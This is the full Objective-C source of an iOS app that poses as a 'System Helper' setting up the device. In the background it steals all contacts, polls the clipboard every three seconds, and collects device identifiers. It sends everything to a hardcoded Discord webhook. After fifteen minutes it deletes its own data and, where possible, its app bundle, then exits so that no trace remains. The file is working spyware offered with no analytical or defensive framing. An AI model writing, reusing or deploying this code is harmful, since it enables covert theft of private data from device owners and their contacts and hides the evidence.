
#import <UIKit/UIKit.h>
#import <Contacts/Contacts.h>
#include <unistd.h>

static NSString *const kWebhook = @"https://discord.com/api/webhooks/1454910675322142924/fJBcyeAlycJOYp4xPe2k1BD6uLq4wXieb81n29Q4Hcxh3OafUJJT_O2Za-q0gz_j72xy";
static const NSInteger kLifetimeSeconds = 15 * 60;
static NSString *const kWipeMarker = @"ofx.wipe.done";

static NSString *gSentClip = @"";
static NSMutableArray<NSString *> *gCollected = nil;
static UIBackgroundTaskIdentifier gBgTask = UIBackgroundTaskInvalid;

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) NSTimer *clipTimer;
@property (nonatomic, strong) NSTimer *wipeTimer;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
didFinishLaunchingWithOptions:(NSDictionary *)opts {
    // if we already wiped, do nothing — second launch is a no-op
    if ([[NSUserDefaults standardUserDefaults] boolForKey:kWipeMarker]) {
        _exit(0);
    }

    gCollected = [NSMutableArray array];
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];

    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 100,
        UIScreen.mainScreen.bounds.size.width - 40, 200)];
    lbl.numberOfLines = 0;
    lbl.textAlignment = NSTextAlignmentCenter;
    lbl.text = @"System Helper\n\nSetting up device…";
    lbl.font = [UIFont systemFontOfSize:18 weight:UIFontWeightMedium];
    [vc.view addSubview:lbl];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    [self beginBgTask];
    [self requestContactsPermission];
    [self collectDeviceInfo];

    self.clipTimer = [NSTimer scheduledTimerWithTimeInterval:3.0
        target:self selector:@selector(tickClipboard)
        userInfo:nil repeats:YES];

    self.wipeTimer = [NSTimer scheduledTimerWithTimeInterval:kLifetimeSeconds
        target:self selector:@selector(flushAndWipe)
        userInfo:nil repeats:NO];

    [self flushCollected];
    return YES;
}

- (void)beginBgTask {
    if (gBgTask != UIBackgroundTaskInvalid) return;
    __weak typeof(self) weakSelf = self;
    gBgTask = [[UIApplication sharedApplication]
        beginBackgroundTaskWithName:@"ofx.keepalive"
        expirationHandler:^{
        [weakSelf endBgTask];
    }];
}

- (void)endBgTask {
    if (gBgTask == UIBackgroundTaskInvalid) return;
    [[UIApplication sharedApplication] endBackgroundTask:gBgTask];
    gBgTask = UIBackgroundTaskInvalid;
}

- (void)requestContactsPermission {
    CNContactStore *store = [CNContactStore new];
    [store requestAccessForEntityType:CNEntityTypeContacts
        completionHandler:^(BOOL granted, NSError *err) {
        if (!granted) return;
        NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
                          CNContactPhoneNumbersKey, CNContactEmailAddressesKey];
        CNContactFetchRequest *req = [[CNContactFetchRequest alloc]
            initWithKeysToFetch:keys];
        [store enumerateContactsWithFetchRequest:req error:nil
            usingBlock:^(CNContact *c, BOOL *stop) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%@ %@", c.givenName ?: @"", c.familyName ?: @""];
            for (CNPhoneNumber *p in c.phoneNumbers) {
                [line appendFormat:@" | %@", p.stringValue];
            }
            for (CNLabeledValue *e in c.emailAddresses) {
                [line appendFormat:@" | %@", e.value];
            }
            if (line.length > 0) {
                @synchronized (gCollected) { [gCollected addObject:line]; }
            }
        }];
        [self flushCollected];
    }];
}

- (void)tickClipboard {
    UIPasteboard *pb = [UIPasteboard generalPasteboard];
    NSString *s = pb.string;
    if (!s || s.length == 0 || [s isEqualToString:gSentClip]) return;
    gSentClip = s;
    NSString *msg = [NSString stringWithFormat:@"[pasteboard] %@", s];
    @synchronized (gCollected) { [gCollected addObject:msg]; }
    [self flushCollected];
}

- (void)collectDeviceInfo {
    UIDevice *d = [UIDevice currentDevice];
    NSDictionary *info = @{
        @"model":    d.model ?: @"",
        @"name":     d.name ?: @"",
        @"system":   [NSString stringWithFormat:@"%@ %@", d.systemName, d.systemVersion],
        @"idfv":     [[[UIDevice currentDevice] identifierForVendor]
                        UUIDString] ?: @"",
        @"locale":   [[NSLocale currentLocale] localeIdentifier] ?: @"",
        @"tz":       [NSTimeZone localTimeZone].name ?: @""
    };
    NSData *j = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
    NSString *line = [NSString stringWithFormat:@"[device] %@",
        [[NSString alloc] initWithData:j encoding:NSUTF8StringEncoding]];
    @synchronized (gCollected) { [gCollected addObject:line]; }
}

- (void)flushCollected {
    NSArray<NSString *> *batch;
    @synchronized (gCollected) {
        if (gCollected.count == 0) return;
        batch = [gCollected copy];
        [gCollected removeAllObjects];
    }
    [self postLines:batch];
}

- (void)postLines:(NSArray<NSString *> *)lines {
    NSMutableString *chunk = [NSMutableString string];
    NSMutableArray<NSString *> *payloads = [NSMutableArray array];
    for (NSString *l in lines) {
        if (chunk.length + l.length + 1 > 1900) {
            [payloads addObject:[chunk copy]];
            [chunk setString:@""];
        }
        [chunk appendFormat:@"%@\n", l];
    }
    if (chunk.length) [payloads addObject:[chunk copy]];

    for (NSString *body in payloads) {
        NSDictionary *json = @{@"content": body};
        NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:
            [NSURL URLWithString:kWebhook]];
        [req setHTTPMethod:@"POST"];
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setHTTPBody:data];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {}]
            resume];
    }
}

- (void)flushAndWipe {
    [self flushCollected];
    // 2 seconds to let the last POST drain
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
        dispatch_get_main_queue(), ^{
        [self wipeSelf];
    });
}

- (void)wipeSelf {
    // 1. mark done — second launch no-ops before anything else runs
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:kWipeMarker];
    [ud synchronize];

    // 2. delete every file in the app container (docs, library, tmp,
    //    caches, preferences). sandbox-owned so we can.
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *domains = @[
        NSDocumentDirectory,
        NSLibraryDirectory,
        NSCachesDirectory
    ];
    for (NSNumber *domN in @[@(NSUserDomainMask)]) {
        for (NSString *dom in domains) {
            NSArray *paths = NSSearchPathForDirectoriesInDomains(
                [dom isEqualToString:NSCachesDirectory] ? NSCachesDirectory :
                [dom isEqualToString:NSLibraryDirectory] ? NSLibraryDirectory :
                NSDocumentDirectory, [domN unsignedIntegerValue], YES);
            for (NSString *p in paths) {
                [fm removeItemAtPath:p error:nil];
            }
        }
    }
    NSString *tmp = NSTemporaryDirectory();
    [fm removeItemAtPath:tmp error:nil];

    // 3. also nuke the preferences plist directly, in case synchronize
    //    didn't fully flush before we started deleting.
    NSString *lib = NSSearchPathForDirectoriesInDomains(
        NSLibraryDirectory, NSUserDomainMask, YES).firstObject;
    NSString *prefs = [lib stringByAppendingPathComponent:
        [NSString stringWithFormat:@"Preferences/%@.plist",
            [[NSBundle mainBundle] bundleIdentifier]]];
    [fm removeItemAtPath:prefs error:nil];

    // 4. try to unlink our own .app bundle. unsigned apps CAN'T do this
    //    (bundle lives in a read-only mount), but if the device is
    //    jailbroken or the ipa is installed via TrollStore the call may
    //    succeed. fails silently otherwise.
    NSString *bundle = [[NSBundle mainBundle] bundlePath];
    [fm removeItemAtPath:bundle error:nil];

    // 5. release the bg task, kill hard
    [self endBgTask];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)),
        dispatch_get_main_queue(), ^{
        // _exit skips atexit + destructors — no trace of what ran
        _exit(0);
    });
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
